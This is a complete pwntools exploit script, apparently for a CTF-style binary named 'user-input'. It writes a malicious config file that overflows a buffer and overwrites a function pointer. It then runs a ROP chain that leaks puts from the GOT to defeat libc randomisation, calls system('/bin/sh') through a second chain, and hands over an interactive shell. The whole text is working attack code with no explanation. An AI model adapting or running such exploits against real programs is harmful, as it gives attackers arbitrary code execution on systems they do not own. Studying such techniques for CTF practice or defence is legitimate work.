#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./user-input", checksec=True)
libc = elf.libc
context.log_level = "debug"
#context.log_level = "critical"  # quiet mode

gs = """
# main()
b *0x004016be
# call rdx
b *0x00401849
# configParser()
b *0x0040159e
b *0x401743
continue
"""

def start():
    if args.GDB:
        return gdb.debug([elf.path, "config"], gdbscript=gs)
    else:
        return process([elf.path, "config"])


def payload_builder(fn_ptr: int, buf: bytes):
    payload = b"P\x00"                # size (max size 0x50)
    payload += buf                    # will be excecuted via the stack

    payload += b"rR"                  # compare bytes
    payload += b"\x00"*4              # junk, used in one of the read calls (doesn't matter)
    
    payload += b"P\x00"               # size of 0x1e 
    payload += b"A"*22 + p64(fn_ptr)

    print(len(payload))
    with open("config", "wb") as file:
        file.write(payload)

    return payload


def payload_one():
    stack_payload = bytearray(0x50)
    stack_payload[0x00: 0x08] = pop_rdi
    stack_payload[0x08: 0x10] = p64(elf.got.puts)
    stack_payload[0x10: 0x18] = p64(elf.plt.puts)
    stack_payload[0x18: 0x20] = p64(u64(pop_rdi)+1)
    stack_payload[0x20: 0x28] = p64(elf.sym.malloc)
    stack_payload[0x28: 0x30] = p64(0x401743)

    payload_builder(0x401933, stack_payload)

def payload_two():
    stack_payload = bytearray(0x50)
    stack_payload[0x00: 0x08] = pop_rdi
    stack_payload[0x08: 0x10] = p64(next(libc.search(b"/bin/sh\0")))
    stack_payload[0x10: 0x18] = p64(libc.sym.system)
    stack_payload[0x18: 0x30] = b"A" * (0x30-0x18)

    return payload_builder(0x401932, stack_payload)

if __name__ == "__main__":
    pop_rdi = p64(0x401933)
    pop_rsi_r15 = p64(0x401931)
    payload_one()

    io = start()
    leak = io.recvline().strip()
    leak = u64(leak.ljust(8, b"\x00"))
    libc.address = leak - libc.sym.puts
    print(f"LIBC BASE @ {libc.address:#0x}")
    io.sendline(payload_two())
    io.interactive()
